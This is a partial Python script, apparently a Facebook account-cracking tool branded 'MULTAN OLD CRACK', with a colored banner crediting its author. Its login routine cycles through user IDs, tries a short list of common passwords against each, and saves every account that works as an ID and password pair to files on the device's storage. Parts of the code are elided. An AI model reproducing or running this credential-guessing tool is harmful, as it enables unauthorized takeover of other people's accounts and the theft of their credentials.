#Sc gift by MULTAN KING
#Github: https://https://github.com/babaallu2
#Tool Type : MULTAN OLD CRACK 
#----------------------------[IMPORT/MODULE]-----------------------------------#
...
#----------------------------[LOGO]-----------------------------------#
logo = (f"""        
\033[1;33m._      _     _   _____  ____  _     
/ \__/|/ \ /\/ \ /__ __\/  _ \/ \  /|
| |\/||| | ||| |   / \  | / \|| |\ ||
| |  ||| \_/|| |_/\| |  | |-||| | \||
\_/  \|\____/\____/\_/  \_/ \|\_/  \|
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  MULTAN KING
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  MULTAN INXIDE
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB          : babaallu2    
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  4.0
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mMULTAN OLD CRACK\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
...
def login(uid):
    ...
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mAxF-AYUSH\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mAxF-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/multan-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33mAxF-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/multan-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
